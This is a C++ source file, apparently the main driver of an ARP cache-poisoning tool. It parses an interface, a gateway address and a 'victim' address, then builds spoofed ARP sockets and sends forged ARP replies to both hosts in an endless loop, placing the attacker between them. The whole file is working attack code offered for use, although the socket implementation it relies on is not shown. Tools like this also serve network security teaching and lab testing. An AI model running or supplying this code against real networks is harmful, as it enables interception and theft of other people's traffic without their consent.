#include "arp_socket.hpp"
#include <cstdint>
#include <cstring>
#include <ctime>
#include <format>
#include <memory>
#include <optional>
#include <stdexcept>
#include <unistd.h>

namespace {

    inline void print_usage(const char* const appName)
    {
        ::fprintf(stdout,
                  "Usage %s:"
                  " -i<interface>"
                  " -g<gateway-ip-addr>"
                  " -t<victim-ip-addr>"
                  " -r<retransmit-interval-in-milliseconds>"
                  " [-h]\n",
                  appName);
    }

    inline bool is_valid_number(const std::string& value)
    {
        auto itr = value.begin();
        for (; itr != value.end(); ++itr) {
            if (!std::isdigit(static_cast<unsigned char>(*itr))) {
                return false;
            }
        }
        return true;
    }

    inline std::int64_t milliseconds_to_sec(std::int64_t value)
    {
        return value / 1000;
    }

    inline std::int64_t milliseconds_to_nsec(std::int64_t value)
    {
        return (value % 1000) * static_cast<std::int64_t>(1e6);
    }
} // namespace

int main(int argc, char** argv)
{
    if (argc < 2) {
        return print_usage(argv[0]), 1;
    }

    // Minimum retransmit interval of 500 milliseconds  (0.5 seconds)
    std::int64_t kMinRetransmitInterval = 500;
    // Minimum retransmit interval of 100,000 milliseconds (100 seconds)
    std::int64_t kMaxRetransmitInterval = 100000;

    std::optional<std::int64_t> requestedRetransmitInterval;

    std::string interface; // The ethernet interface
    std::string gatewayIpAddr; // Gateway
    std::string victimIpAddr; // Victim

    for (int opt; (opt = ::getopt(argc, argv, "hi:g:t:r:")) != -1;) {
        switch (opt) {
            case 'h':
            {
                print_usage(argv[0]);
                return 0;
            }

            case 'g':
            {
                gatewayIpAddr = optarg;
                break;
            }

            case 't':
            {
                victimIpAddr = optarg;
                break;
            }

            case 'i':
            {
                interface = optarg;
                break;
            }

            case 'r':
            {
                std::string value(optarg);
                try {
                    if (is_valid_number(value)) {
                        requestedRetransmitInterval = std::stoi(value);
                    } else {
                        std::string message = std::format(
                            "Invalid retransmit interval requested, "
                            "defaulting to {} ms",
                            kMinRetransmitInterval);
                        requestedRetransmitInterval = kMinRetransmitInterval;
                        ::fprintf(stdout, "%s", message.c_str());
                    }
                } catch (...) {
                    std::string message
                        = std::format("Invalid retransmit interval requested, "
                                      "defaulting to {} ms",
                                      kMinRetransmitInterval);
                    requestedRetransmitInterval = kMinRetransmitInterval;
                    ::fprintf(stdout, "%s", message.c_str());
                }
            } break;

            default:
            {
                return 1;
            }
        }
    }

    if (interface.empty()) {
        ::fprintf(stdout, "Interface not specified. Use -i xxxx");
        return 1;
    }

    if (gatewayIpAddr.empty()) {
        ::fprintf(stdout,
                  "Gateway address not specified. Use -g xxx.xxx.xxx.xxx");
        return 1;
    }

    if (victimIpAddr.empty()) {
        ::fprintf(stdout,
                  "Target address not specified. Use -t xxx.xxx.xxx.xxx");
        return 1;
    }

    if (!requestedRetransmitInterval.has_value()) {
        std::string message = std::format(
            "No retransmit interval requested, defaulting to {} ms",
            kMinRetransmitInterval);
        requestedRetransmitInterval = kMinRetransmitInterval;
        ::fprintf(stdout, "%s", message.c_str());
    }

    else if (requestedRetransmitInterval.value() < kMinRetransmitInterval) {
        std::string message
            = std::format("Requested retransmit interval of {} milliseconds is "
                          "too small, defaulting to {} milliseconds",
                          requestedRetransmitInterval.value(),
                          kMinRetransmitInterval);
        requestedRetransmitInterval = kMinRetransmitInterval;
        ::fprintf(stdout, "%s", message.c_str());
    }

    else if (requestedRetransmitInterval.value() > kMaxRetransmitInterval) {
        std::string message
            = std::format("Requested retransmit interval of {} milliseconds is "
                          "too large, defaulting to {} milliseconds",
                          requestedRetransmitInterval.value(),
                          kMaxRetransmitInterval);
        requestedRetransmitInterval = kMaxRetransmitInterval;
        ::fprintf(stdout, "%s", message.c_str());
    }

    std::unique_ptr<spoof::ArpSocket> victim;
    std::unique_ptr<spoof::ArpSocket> gateway;

    try {
        spoof::Ip4Addr victimAddr;
        spoof::Ip4Addr gatewayAddr;

        // Locate victim machine
        victimAddr = spoof::locate_ip4_addr(interface, victimIpAddr);
        gatewayAddr = spoof::locate_ip4_addr(interface, gatewayIpAddr);

        victim = spoof::ArpSocket::create_spoofed_gateway(
            interface, victimAddr, std::string(gatewayAddr.ip4));
        gateway = spoof::ArpSocket::create_spoofed_machine(
            interface, gatewayAddr, std::string(victimAddr.ip4));
    }

    catch (const std::runtime_error& e) {
        ::fprintf(stdout, "%s", e.what());
        return 1;
    }

    std::int64_t interval = requestedRetransmitInterval.value();
    const timespec retransmitInterval
        = {.tv_sec = milliseconds_to_sec(interval),
           .tv_nsec = milliseconds_to_nsec(interval)};

    // Enter main program loop
    while (true) {
        // Transmit
        if (!gateway->send_reply()) {
            ::fprintf(stdout, "%s\n", ::strerror(errno));
            return 1;
        }

        // Transmit
        if (!victim->send_reply()) {
            ::fprintf(stdout, "%s\n", ::strerror(errno));
            return 1;
        }

        // Sleep for the required interval before retransmitting
        ::nanosleep(&retransmitInterval, nullptr);
    }
}
